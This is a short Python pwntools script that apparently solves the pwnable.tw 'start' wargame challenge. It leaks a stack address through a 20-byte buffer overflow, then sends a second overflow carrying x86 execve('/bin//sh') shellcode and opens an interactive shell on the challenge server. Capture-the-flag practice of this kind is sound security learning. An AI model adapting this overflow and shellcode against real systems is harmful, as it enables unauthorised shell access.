#!/bin/python3
from pwn import *

# Setup environment
context.binary = binary = ELF('./start')
#context.log_level = 'debug'

# Connect process 
#p = process('./start')
p = remote('chall.pwnable.tw', 10000)

# First input - leak stack
gadget_addr = 0x08048087
payload_1 = b'A' * 20 + p32(gadget_addr)

p.recvuntil(b':')
p.send(payload_1)

# Receive leak
leak = p.recv(4) 
stack_addr = u32(leak)
print(f"[+] leak: {hex(stack_addr)}")

# Second input - shellcode
shellcode_addr = stack_addr + 20
print(f"[+] shellcode addr: {hex(shellcode_addr)}")

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x83\xc0\x0b\xcd\x80'
payload_2 = b'A' * 20 + p32(shellcode_addr) + shellcode
p.send(payload_2)
p.interactive()
